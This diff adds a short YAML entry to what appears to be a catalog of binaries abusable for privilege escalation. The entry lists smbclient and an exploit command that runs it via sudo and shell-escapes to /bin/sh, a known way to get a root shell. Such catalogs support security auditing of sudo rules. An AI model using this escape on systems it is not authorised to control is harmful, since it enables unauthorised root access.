@@ -1,0 +1,4 @@
+name: smbclient
+binary_path: /usr/bin/smbclient
+exploit_cmds:
+- sudo /usr/bin/smbclient '\\host\share' && !/bin/sh
